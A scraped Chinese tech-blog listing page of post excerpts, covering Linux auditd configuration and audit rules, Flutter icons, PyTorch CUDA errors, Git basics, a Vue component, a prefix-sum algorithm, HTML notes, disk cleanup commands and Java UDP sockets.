# 配置项解析，只列举了一部分 1.log_file：审计日志文件的完整路径； 2.log_format：写日志时使用的格式； 3.flush：多长时间向日志文件中写一次数据。（值可以是NONE、INCREMENTAL、DATA和SYNC之一。如果设置为NONE，则不需要做特殊努力来将数据刷新到日志文件中。如果设置为INCREMENTAL，则用freq选项的值确定多长时间发生一次向磁盘的刷新。如果设置为DATA，则审计数据和日志文件一直是同步的。如果设置为SYNC，则每次写到日志文件时，数据和元数据是同步的。） 4.freq：如果flush设置为INCREMETNAL，审计守护进程在写到日志文件中前 从内核中接收的记录数。 5.num_logs：max_log_file_action：如果没有设置num_logs值，它就默认为0，意味着从来不循环日志文件。设置为ROTATE时要保存的日志文件数目。必须是0~99之间的数。如果设置为小于2，则不会循环日志。如果递增了日志文件的数目，就可能有必要递增/etc/audit/audit.rules中的内核backlog设置值，以便留出日志循环的时间。 6.space_left：以兆字节表示的磁盘空间数量。当达到这个水平时，会采取space_left_action参数中的动作。 7.space_left_action：当磁盘空间量达到space_left中的值时，采取这个动作。有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和 HALT。 7.1如果设置为IGNORE，则不采取动作。 7.2如果设置为SYSLOG，则向系统日志/var/log/messages写一条警告消息。 7.3如果设置为 EMAIL，则从action_mail_acct向这个地址发送一封电子邮件，并向/var/log/messages中写一条警告消息。 7.4如果设置为 SUSPEND，则不再向审计日志文件中写警告消息。 7.5如果设置为SINGLE，则系统将在单用户模式下。如果设置为SALT，则系统会关闭。 8.action_mail_acct：负责维护审计守护进程和日志的管理员的电子邮件地址。如果地址没有主机名，则假定主机名为本地地址，比如root。必须安装sendmail并配置为向指定电子邮件地址发送电子邮件。 9.admin_space_left：以兆字节表示的磁盘空间数量。这个值应小于space_left。如果达到这个水平，则会采取admin_space_left_ action所指定的动作。(用这个选项设置比space_left更多的主动性动作，以防万一space_left_action没有让管理员释放任何磁盘空间。) 10.admin_space_left_action：当自由磁盘空间量达到admin_space_left指定的值时，则采取动作。有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和HALT。与这些值关联的动作与space_left_action中的相同。 11.disk_full_action：如果含有审计文件的分区已满，则采取这个动作。可能值为IGNORE、SYSLOG、SUSPEND、SINGLE和HALT。与这些值关联的动作与space_left _action中的相同。（提示：如果不循环审计日志文件，则含有/var/log/audit/的分区可能变满并引起系统错误。因此，建议让/var/log/audit/位于一个单独的专用分区。） 12.disk_error_action：如果在写审计日志或循环日志文件时检测到错误时采取的动作。值必须是IGNORE、SYSLOG、SUSPEND、SINGLE和HALT之一。与这些值关的动作与space_left_action中的相同。 四、审计规则 控制规则：用于更改审计系统本身的配置和设置。 auditctl -b 8192	# 配置buffer大小为8M auditctl -e 0 auditctl -f 2 auditctl -s 文件系统规则：审核对特定文件或目录的任何类型的访问（比较常见） # 项太多了，举例一个，监控针对/etc/passwd文件的读、写、执行和属性改变，关键字为change_passwd auditctl -w /etc/passwd -p rwxa -k change_passwd # 如果要查询， ausearch -i -k change_passwd 详见附录 auditctl -h
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10eb4d6722eb251b54b04c08cd764db0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/261c1e829c0806b1aef0c51d8db161a2/" rel="bookmark">
			Flutter 中使用 ICON
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flutter Icon URL ： https://fonts.google.com/icons：
在Flutter中使用 Icon 步骤如下：
导入图标库 在Dart 文件中导入 material.dart 包，该包包含了 Flutter 的图标库。
import 'package:flutter/material.dart'; 使用图标组件 通过 Icon 来创建图标组件，Icon 组件接受一个 IconData 对象作为参数，用于指定要显示的具体图标。
具体图标可以去 该网站找，然后复制对应的 Icon name 即可。
Icon 参数：如下
Icon( IconData? icon, { Key? key, double? size, double? fill, double? weight, double? grade, double? opticalSize, Color? color, List&lt;Shadow&gt;? shadows, String? semanticLabel, TextDirection? textDirection, }) color：设置图标的颜色。size：设置图标的大小。semanticLabel：设置图标的语义标签，用于辅助功能。 完整示例:
Icon( Icons.favorite, // 使用预定义的图标名称 size: 30.0, // 设置图标大小为 30.0 像素 semanticLabel: 'Accessibility', // 设置语义标签为 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/261c1e829c0806b1aef0c51d8db161a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90431def886c2e34f085dc349680cdf9/" rel="bookmark">
			python 深度学习 记录遇到的报错问题10
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇继python 深度学习 解决遇到的报错问题9_module 'd2l.torch' has no attribute 'train_ch3-CSDN博客
一、CUDA error: no kernel image is available for execution on the device CUDA kernel errors might be asynchronously reported at some other API call,so the stacktrace below might be incorrect. For debugging consider passing CUDA_LAUNCH_BLOCKING=1. 警告：
然后模型训练的时候，报错： 原因：为什么把警告打印出来，是因为警告可以让我们了解一些有用信息。首先警告里的内容不可忽略，翻译过来就是NVIDIA RTX A4000与CUDA功能sm_86不兼容当前的PyTorch安装。当前的PyTorch安装支持CUDA功能sm_37 sm_50 sm_60 sm_70。说白了就是CUDA和pytorch版本不一致。
解决方法：安装的torch应该是cpu版本的，需要换成gpu版本的。
验证CUDA设备的可用性：使用torch.cuda.is_available()检查CUDA是否可用，并使用torch.cuda.device_count()检查可用的CUDA设备数量。确保代码正常选择并使用可用的CUDA设备。
二、torch.cuda.OutOfMemoryError: CUDA out of memory. Tried to allocate 4.86 GiB. GPU 0 has a total capacty of 15.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90431def886c2e34f085dc349680cdf9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/060d146721dc7b16697e65db4353cc91/" rel="bookmark">
			人工智能论文通用创新点(持续更新中...)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.自注意力机制与卷积结合 论文：On the Integration of Self-Attention and Convolution
1：卷积可以接受比较大的图片的，但自注意力机制如果图片特别大的话，运算规模会特别大，即上图中右边(卷积)会算得比较快，左边(自注意力机制)会算得比较慢，所以我们要想些办法让自注意力机制规模小一点，本篇文章就只让qkv计算部分区域，而不是整个全局图片了。
2：自注意力机制中的qkv与卷积中的卷积核(比如说3x3的卷积核)能否一起得到？额，好像两者不是一类东西，但如果qkv用1x1的卷积核话，似乎有可能..
但是1x1的卷积核与3x3的卷积核似乎很难配套，有没有可能将3x3的卷积核用9个1x1的卷积核去替代呢？那既然两者(自注意力机制与卷积)都用到1x1的卷积，不妨两者共享1x1的卷积？ 论文解读：
论文解读：On the Integration of Self-Attention and Convolution-CSDN博客
2.新的坐标注意力机制Coordinate Attention 论文：Coordinate Attention for Efficient Mobile Network Design(CVPR2021)
最近关于mobile network设计的研究已经证明了通道注意(例如，the Squeeze-and-Excitation attention)对于提高模型性能的显着有效性，但它们通常忽略了位置信息，而位置信息对于生成空间选择性注意图非常重要。在本文中，我们提出了一种新的移动网络注意机制，将位置信息嵌入到通道注意中，我们称之为“坐标注意(coordinate attention)”。与通过二维全局池化将特征张量转换为单个特征向量的通道注意不同，坐标注意将通道注意分解为两个一维特征编码过程，分别沿着两个空间方向聚合特征。这样可以在一个空间方向上捕获远程依赖关系，同时在另一个空间方向上保持精确的位置信息。然后将得到的特征图分别编码为一对方向感知和位置敏感的注意图，它们可以互补地应用于输入特征图，以增强感兴趣对象的表示。
论文解读：论文解读：Coordinate Attention for Efficient Mobile Network Design(CVPR2021)-CSDN博客
3. 更好的下采样操作SPD 论文：No More Strided Convolutions or Pooling:A New CNN Building Block for Low-ResolutionImages and Small Objects
之前常规的操作都是通过stride和pooling这些下采样操作，但是这些操作都会或多或少丢失图像的信息，所以这不适用于具有低分辨率图像和小物体的更困难的任务上。像池化选择maxpooling或者是averagepooling、卷积的步长(太大的话会丢失信息)都是很头疼的问题，为此设计SPD模型。
论文解读：论文解读：A New CNN Building Block for Low-ResolutionImages and Small Objects-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94e602e225789e2cdbe3e7cb4f5d1725/" rel="bookmark">
			《2023我的编程之旅》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在2023年，我经历了一段充满挑战与成长的编程之旅。这一年，我不仅在技术上取得了显著的进步，也在职业规划与心灵成长方面有了更多的认识。现在，我想通过这篇文章，分享我的经历、感悟和未来的规划。
一、印象深刻的实战经历 在这一年中，我参与了几个重要的项目，其中最让我印象深刻的是与团队共同开发的一个复杂的数据分析系统。这个项目不仅涉及到了多种编程语言和框架，还需要处理大规模的数据，并保证系统的稳定性和性能。通过这个项目，我不仅提高了自己的技术能力，还学到了如何与团队成员有效沟通和协作。
二、系统学习新技术的心得体会 为了更好地适应行业的发展和满足项目的需求，我系统地学习了新技术。我发现，学习新技术不仅要阅读相关的书籍和文档，还需要不断地实践和探索。同时，与行业内的专业人士交流也是非常有益的，因为他们可以分享宝贵的经验并给出有针对性的建议。
三、精心整理的技术文档 在学习的过程中，我发现整理技术文档是非常重要的。通过整理，我可以更好地理解和巩固知识，也可以在以后的工作中快速地查找和使用。因此，我养成了整理技术文档的习惯，并不断完善和更新。
四、想要安利给所有人的开发工具 这一年里，我发现了几款非常实用的开发工具，其中最让我推荐的是一款名为“Git”的版本控制工具。通过使用Git，我可以更好地管理代码版本，跟踪代码的变更历史，以及与其他团队成员协同工作。我相信这些工具可以提高开发效率和质量，因此想要推荐给所有人。
五、对技术行业的深度思考 随着我对技术行业的了解加深，我开始思考这个行业的未来发展趋势。我认为人工智能和大数据将会是未来的重要方向，而编程也将成为一项必备的技能。因此，我希望能够在这个行业中不断学习和进步，跟上时代的步伐。
六、职业规划与心灵成长 在这一年的编程之旅中，我也对自己的职业规划和心灵成长有了更深入的认识。我意识到职业规划不仅仅只是选择一个适合自己的职业方向，更是要不断地学习和提高自己的能力，以应对不断变化的市场环境。同时，我也意识到心灵成长的重要性，只有保持积极的心态和不断追求进步的精神，才能在职业生涯中取得更大的成功。
七、新年Flag 在即将到来的2024年，我给自己定下了几个Flag：首先是要进一步提高自己的技术能力；其次是尝试更多的新项目和挑战自己的极限；最后是积极参与行业内的交流和分享活动，与更多的专业人士共同成长。
八、在项目中取得的辉煌成绩 在过去的一年中，我在项目中取得了一些成绩。我参与开发的系统成功地帮助客户提高了工作效率和数据处理的准确性；我负责的模块在性能和稳定性方面都达到了预期的要求；我还帮助团队解决了一些关键的技术难题，得到了领导和同事的认可。这些成绩是我不断努力和学习的结果，也为我未来的发展打下了坚实的基础。
九、在应用开发中遇到的问题与解决方案 在项目的开发过程中，我也遇到了一些问题。例如在处理大规模数据时系统性能下降的问题、在集成测试阶段发现的模块间通信问题等。针对这些问题，我采取了相应的解决方案：优化数据结构和算法以提高处理速度、调整模块间的通信协议以保证数据的一致性。这些解决方案有效地解决了问题，也让我学到了更多的经验和技巧。
十、职场经历与升职感悟 在这一年的职场经历中，我不仅学到了很多专业知识，还领悟到了很多人生哲理。我明白了在职场中要保持积极的态度和不断学习的精神；要注重团队合作和有效沟通；还要敢于挑战自己和承担责任。这些感悟让我在职场中取得了更好的成绩和发展机会。
十一、编程语言的新趋势 随着技术的不断发展，编程语言也在不断演变和更新。根据行业内的趋势和市场需求，我认为未来几年内Python和Golang将会成为主流的编程语言。Python由于其简洁易懂的语法和丰富的库支持而受到广泛欢迎；Golang则由于其高效的性能和适用于并发编程的特点而备受瞩目。因此，我会继续关注这些新趋势并学习相关的知识。
十二、我的最佳代码实践 在编写代码的过程中，我总结了一些最佳实践。例如在编写函数时尽量只做一件事并保持函数名清晰明了；在代码中避免使用全局变量以减少副作用；在编写代码前先进行充分的思考和设计以减少重构的可能性等。这些实践让我编写出了更加清晰、可读性更强且易于维护的代码。
十三、我的最大收获与成长 通过这一年的编程之旅，我获得了最大的收获与成长是学会了如何更好地解决问题和管理时间。我意识到解决问题时需要有清晰的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/551bc624bdfc66c8891587662af9a874/" rel="bookmark">
			如何使用Git
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Git 入门 安装 Git 的步骤因操作系统的不同而不同。以下是一些基本的安装指南：
安装Git 在 Windows 上安装 Git 访问 Git 官方网站 https://git-scm.com/ 并下载适用于 Windows 的 Git 安装程序。
运行安装程序并按照提示进行操作。
在 macOS 上安装 Git 如果你已经安装了 Homebrew，你可以通过运行 brew install git 来安装 Git。
如果你没有安装 Homebrew，你可以从 Git 官方网站 https://git-scm.com/ 下载适用于 macOS 的 Git 安装程序并运行。
在 Linux 上安装 Git 在大多数基于 Debian 的发行版（如 Ubuntu）上，你可以通过运行 sudo apt-get install git 来安装 Git。在基于 Fedora 的发行版上，你可以运行 sudo dnf install git。
使用 Git 的基本步骤如下 初始化 Git 仓库：在你的项目目录中运行 git init。添加文件到 Git 仓库：使用 git add &lt;file&gt; 命令。例如，git add .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/551bc624bdfc66c8891587662af9a874/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb02d0512006172fc19b72cf465e8b14/" rel="bookmark">
			大创项目推荐 深度学习人体语义分割在弹幕防遮挡上的实现 - python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 前言1 课题背景2 技术原理和方法2.1基本原理2.2 技术选型和方法 3 实例分割4 实现效果5 最后 1 前言 🔥 优质竞赛项目系列，今天要分享的是
🚩 深度学习人体语义分割在弹幕防遮挡上的应用
该项目较为新颖，适合作为竞赛课题方向，学长非常推荐！
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：3分 🧿 更多资料, 项目分享：
https://gitee.com/dancheng-senior/postgraduate
1 课题背景 弹幕是显示在视频上的评论，可以以滚动、停留甚至更多动作特效方式出现在视频上，是观看视频的人发送的简短评论。
各大视频网站目前都有弹幕功能，之家也于2020年5月正式上线视频弹幕功能，受到了广大网友的喜爱，大家在观看视频的同时，也能通过弹幕进行互动。
但密集的弹幕，遮挡视频画面，严重影响用户观看体验，如何解决？
查阅了相关视频网站，发现B站推出了一种蒙版弹幕技术，可以让弹幕自动躲避人形区域，达到弹幕不挡人的效果。
B站视频弹幕不挡人的效果
2 技术原理和方法 2.1基本原理 通过AI计算机视觉的技术，对视频内容进行分析，并将之前已经定义好的“视频主体内容”进行识别，生成蒙版并分发给客户端后，让客户端利用 CSS3
的特性进行渲染从而达成最终的效果。这样就形成了我们最终看到的，“不挡脸”弹幕效果。
实现方法就正如 PS
中的“蒙版“一样，实心区域允许，空白区域拒绝，从而达到弹幕不挡人的效果。而技术的核心就在蒙版的生成上，所以将这个功能称之为“蒙版弹幕”。
2.2 技术选型和方法 1、提取视频帧画面。对音视频的处理，大家一般都会想到FFmpeg组件，我们也是使用FFmpeg组件提取每帧的视频画面，使用的是PyAV组件，PyAV是FFmpeg封装，能够灵活的编解码视频和音频，并且支持Python常用的数据格式（如numpy）。
2、识别视频帧画面人像区域。解决方案：使用AI计算机视觉的实例分割技术，可以识别视频帧画面的人像区域。
3、AI框架：目前市面上的AI框架，主要以TensorFlow，PyTorch最流行。
TensorFlow ：出身豪门的工业界霸主，由Google Brain团队研发。具有如下优点：支持多种编程语言；灵活的架构支持多GPU、分布式训练，跨平台运行能力强；自带 TensorBoard 组件，能可视化计算图，便于让用户实时监控观察训练过程；官方文档非常详尽，可查询资料众多；社区庞大，大量开发者活跃于此。PyTorch ：以动态图崛起的学术界宠儿，是基于 Torch 并由Facebook强力支持的python端的开源深度学习库。具有如下优点：简洁： PyTorch 在设计上更直观，追求尽量少的封装，建模过程透明，代码易于理解；易用：应用十分灵活，接口沿用 Torch ，契合用户思维，尽可能地让用户实现“所思即所得”，不过多顾虑框架本 PyTorch 。原因： TensorFlow 入门难度较大，学习门槛高，系统设计过于复杂；而 PyTorch 入门难度低，上手快，而且提供的功能也非常易用，预训练模型也非常多。 4、实例分割技术：实例分割（Instance Segmentation）是视觉经典四个任务中相对最难的一个，它既具备语义分割（Semantic
Segmentation）的特点，需要做到像素层面上的分类，也具备目标检测（Object
Detection）的一部分特点，即需要定位出不同实例，即使它们是同一种类。
3 实例分割 简介
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb02d0512006172fc19b72cf465e8b14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a550d3de8b2bed78aa438bca3db89c85/" rel="bookmark">
			Vue开发者必备！手把手教你实现类似Element Plus的全局提示组件！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在Web开发中，用户体验至关重要。有效的信息提示和错误消息对于确保用户更好地理解和操作至关重要。在这个背景下，全局弹框提示组件成为了一个非常有用的工具。Vue.js，作为当前最受欢迎的前端框架之一，为创建灵活、可复用的弹框组件提供了强大的支持。本文将介绍一个简单而强大的全局弹框提示组件，并探讨它是如何实现的。
组件示例 ​​
​
代码展示 Message.vue 首先，让我们看看这个全局弹框提示组件的Vue文件。
// Message.vue &lt;template&gt; &lt;div class="message" v-if="visible"&gt; &lt;img :src="imgSrc" /&gt; &lt;span class="text"&gt;{{ text }}&lt;/span&gt; &lt;/div&gt; &lt;/template&gt; &lt;script setup lang="ts"&gt; import { onMounted, PropType, ref } from 'vue'; const props = defineProps({ text: { type: String, default: '', }, type: { type: String as PropType&lt;'warn' | 'error' | 'success'&gt;, default: 'warn', }, }); const visible = ref(false); const imgSrc = ref('@/assets/img/warn.svg'); onMounted(() =&gt; { switch (props.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a550d3de8b2bed78aa438bca3db89c85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6140dfcbc5cf2a99b645897ca081f608/" rel="bookmark">
			前缀和算法 -- [模版]二维前缀和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人主页：Lei宝啊 愿所有美好如期而遇
本题链接 【模板】二维前缀和_牛客题霸_牛客网 输入描述 n是行，m是列，q是查询次数，x1，y1，x2，y2是二维数组的下标。
输出描述 通过两对下标，计算这两对下标构成的这个子矩阵的和。
算法分析 算法一：暴力求解 直接遍历数组，我们考虑最坏情况就是q次查询都是从头遍历到尾，时间复杂度就是O(n*m*q)，这绝对是超时的。
算法二：前缀和 我们不希望每次查询时都要遍历去计算和，所以我们就有了创建dp表并进行预处理。
预处理二维dp表 首先我们要明白dp表每一个位置代表的状态，也就是说，dp[i][j] 就代表着从 [1,1] 到 [i,j] 这个子矩阵的和， 同时，我们创建dp表时下标从1开始，也就是说，不仅仅是数组下标从1开始，为什么要从1开始？一个是题目的m和n就是大于等于1的，另一个原因在于使用dp表进行计算时防止越界。
我们先创建这样的数组(示例一)： 接下来就是创建dp表，并进行预处理，但是我们怎么填充dp表呢？暴力遍历吗？分析一下时间复杂度，dp表我们有m*n个元素需要填充，每个元素都代表着子矩阵的和，也就是需要遍历数组，所以整体的时间复杂度就是O(m*n*m*n)， 这样的时间复杂度甚至不如直接暴力求解，我们需要其他方法。
小学的时候，我们计算过面积，计算一块面积有时候直接算并不好算，于是我们分割了图形，求每个部分图形的和。
同理，直接算矩阵和不好算，我们将他分割成A，B，C，D四块，dp[i][j]的值就是A + B + C + D，但是我们发现A好算，就是dp[i-1][j-1]，B和C并不好算，但是A+B呢？A+C呢？
所以我们也就有了思路：
最终我们得到dp表：
使用dp表计算 现在我们有了[1,1]到任意一个下标这个子矩阵的和，现在我们要算任意两个下标构成的子矩阵的和，我们看图：
我们似乎仍然能像面积一样进行分割：
解题源码 #include &lt;iostream&gt; #include &lt;vector&gt; using namespace std; int main() { //n行，m列，q次 int n, m, q; cin &gt;&gt; n &gt;&gt; m &gt;&gt; q; //创建二维数组 vector&lt;vector&lt;int&gt;&gt; vv(n+1,vector&lt;int&gt;(m+1, 0)); for(int i=1; i&lt;n+1; i++) { for(int j=1; j&lt;m+1; j++) { cin &gt;&gt; vv[i][j]; } } //创建dp表并填充 vector&lt;vector&lt;long long&gt;&gt; dp(n+1,vector&lt;long long&gt;(m+1, 0)); for(int i=1; i&lt;n+1; i++) { for(int j=1; j&lt;m+1; j++) { dp[i][j] = dp[i-1][j] +dp[i][j-1] - dp[i-1][j-1] + vv[i][j]; } } while(q--) { int x1, y1, x2, y2; cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2; long long sum = dp[x2][y2] - dp[x1-1][y2] - dp[x2][y1-1] +dp[x1-1][y1-1]; cout &lt;&lt; sum &lt;&lt; endl; } } // 64 位输出请用 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6140dfcbc5cf2a99b645897ca081f608/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5df49ef1b93142d252ba8aa52c6b988/" rel="bookmark">
			网页设计与制作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 对网页设计的课程进行一下总结，方便复习,这篇博客本来就是给自己看的，所以就省略了很多东西。
基础知识 www（万维网缩写）_百度百科 (baidu.com)https://baike.baidu.com/item/www/109924?fr=ge_ala计算机网络——应用层(万维网WWW)_万维网的工作方式-CSDN博客https://blog.csdn.net/weixin_45084986/article/details/118178040URL格式_百度百科 (baidu.com)https://baike.baidu.com/item/URL%E6%A0%BC%E5%BC%8F/10056474?fr=ge_ala可扩展标记语言_百度百科 (baidu.com)https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fr=ge_alaWWW（World Wide Web，万维网）是Internet上基于客户/服务器体系结构的分布式多平台的超文本超媒体信息服务系统，它是Internet的最主要的信息服务，允许用户在一台计算机上通过Internet存取另一台计算机上的信息。
www是以客户机/服务器的方式来工作的，由3个部分协调共同完成的：客户机 、服务器、http协议。
URL是统一资源定位器，它是uniform resource locations的缩写 。
URL的标准结构：协议名称：//主机名称[：端口地址/存放目录/文件名称] 一个标准的url是由4部分组成的：第一是协议；第二是主机名；第三部分就是文件存放在主机上的路径；第四部分是文件名。
HTML HTML_百度百科 (baidu.com)https://baike.baidu.com/item/HTML/97049?fr=ge_ala
标记语言_百度百科 (baidu.com)https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/5964436?fromModule=lemma_inlink超文本_百度百科 (baidu.com)https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC/2832422?fromModule=lemma_inlink
HTML（Hyper Text Markup Language）的全称为超文本标记语言。
标记语言，是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。
超文本是用超链接的方法，将各种不同空间的文字信息组织在一起的网状文本。
编辑这个程序一方面可以通过先在记事本中编辑程序，然后通过修改后缀名的形式来运行。
注释标记&lt;!--...--&gt; 注释并不局限于一行，长度不受限制。结束标记与开始标记可以不在一行上。
&lt;!-- 注释并不局限于一行， 长度不受限制。 结束标记与开始标记 可以不在一行上。 --&gt; 空格字符：&amp;nbsp; 换行&lt;br&gt;，不换号&lt;nobr&gt;...&lt;/nobr&gt;
段落标记&lt;p&gt;...&lt;/p&gt; 段落标记放在一个段落的头尾，用于定义一个段落。属性align用来设置段落文字在网页上的对齐方式：left（左对齐）、center（居中）和right（右对齐）。缺省时默认为left。
定位标记&lt;div&gt;…&lt;/div&gt; 设定文字、图像、表格的摆放位置。align属性同p标签一致。
水平线标记&lt;hr&gt; 在页面中插入一条水平标尺线，可以使不同功能的文字分隔开，看起来整齐、明了。
size设定线条粗细，以像素为单位，默认为2。
width设定线段长度，可以是绝对值（以像素为单位）或相对值（相对于当前窗口的百分比）
color设定线条色彩，默认为黑色。可以采用色彩的名称。色彩可以用相应英文单词或以“#”引导
的一个十六进制数代码来表示。
标题文字标记&lt;h#&gt;…&lt;/h#&gt; 用来指定标题文字的大小，#取1～6的整数值，取1时文字最大，6时文字最小。align属性同前面一致。
字体标记&lt;font&gt;...&lt;/font&gt; 设置字体的大小、字体、字型、色彩。
size用来设置文字的大小。数字的取值范围从1～7，size取1时最小，取7时最大。
face用来设置字体。如黑体、宋体、楷体_GB2312、隶书等。
color用来设置文字色彩。
回乡偶书二首·其一_诗词_百度汉语 (baidu.com)https://hanyu.baidu.com/shici/detail?from=aladdin&amp;pid=3e5b492d37cb4f9d908d6e329cfb1455&amp;showPinyin=1
&lt;html&gt; &lt;head&gt; &lt;title&gt;练习题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- “回乡偶书”用2号标题居中显示 head--&gt; &lt;h2 align="center"&gt;回乡偶书&lt;/h2&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5df49ef1b93142d252ba8aa52c6b988/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddbd1d2cf25f263cb837ff634cddb982/" rel="bookmark">
			Sharding | 数据分片策略：分片键和分片算法的选择
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据分片策略
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96699def77dd3e0e20220d9ae355d1fe/" rel="bookmark">
			Linux 服务器磁盘满了怎么办？详细清理大文件指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🚀 作者主页： 有来技术
🔥 开源项目： youlai-mall 🍃 vue3-element-admin 🍃 youlai-boot
🌺 仓库主页： Gitee 💫 Github 💫 GitCode
💖 欢迎点赞 👍 收藏 ⭐留言 📝 如有错误敬请纠正！
目录 前言1. 确定磁盘使用情况2. 找出占用空间最大的目录3. 查找大文件4. 清理大文件5. 清理缓存和临时文件注意事项 前言 当服务器的磁盘空间满了，您需要找到并清理掉那些占用大量空间的文件。以下是一个步骤指南，帮助您定位和清理大文件：
1. 确定磁盘使用情况 首先，您可以使用以下命令来查看各个磁盘分区的使用情况：
df -h 这个命令会显示每个挂载点的磁盘空间使用情况，帮助您识别哪个分区占用空间最多。
2. 找出占用空间最大的目录 一旦您确定了哪个分区空间紧张，可以使用以下命令来找出该分区中占用空间最大的目录：
du -h /path/to/directory | sort -rh | head -n 20 将/path/to/directory替换为您要检查的分区的根目录，比如/。这个命令将列出占用空间最大的前20个目录。
3. 查找大文件 在特定目录下，您可以使用以下命令来找出单个占用空间最大的文件：
find /path/to/directory -type f -exec du -h {} + | sort -rh | head -n 20 同样地，将/path/to/directory替换为您想要搜索的目录路径。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96699def77dd3e0e20220d9ae355d1fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/350efeb0dc5151867e30e42fdf75a24c/" rel="bookmark">
			udp进行数据发送与接收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：udp发送（这是广播局域网的形式，可以修改为指定IP地址） @SneakyThrows public static void main(String[] args) { String message="中文"; DatagramSocket dgSocket = new DatagramSocket(); byte[] bytes = message.getBytes(); DatagramPacket dgPacket = new DatagramPacket(bytes, bytes.length, InetAddress.getByName("255.255.255.255"), 9000); dgSocket.send(dgPacket); dgSocket.close(); } 2：udp接收 @SneakyThrows public static void main(String[] args) { DatagramSocket dgSocket = new DatagramSocket(9000); // 监听端口号为9000 byte[] buffer = new byte[1024]; DatagramPacket dgPacket = new DatagramPacket(buffer, buffer.length); while (true) { dgSocket.receive(dgPacket); // 接收数据包 String message = new String(dgPacket.getData(), 0, dgPacket.getLength()); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/350efeb0dc5151867e30e42fdf75a24c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bd3dfb2ebd2096385b5107c743b4f70/" rel="bookmark">
			RabbitMQ 教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网地址：
RabbitMQ: easy to use, flexible messaging and streaming — RabbitMQ
教程笔记：
RabbitMQ 入门教程看这一篇就够了 - 知乎
Springboot整合RabbitMq：
SpringBoot 整合 RabbitMQ - 知乎
自学的教程，留存一份。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24372ac3b134f26fa856e0060b91e739/" rel="bookmark">
			论文阅读：基于MCMC的能量模型最大似然学习剖析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		On the Anatomy of MCMC-Based Maximum Likelihood Learning of Energy-Based Models
相关代码：点击
本文只介绍关于MCMC训练的部分，由此可知，MCMC常常被用于训练EBM。最后一张图源于Implicit Generation and Modeling with Energy-Based Models
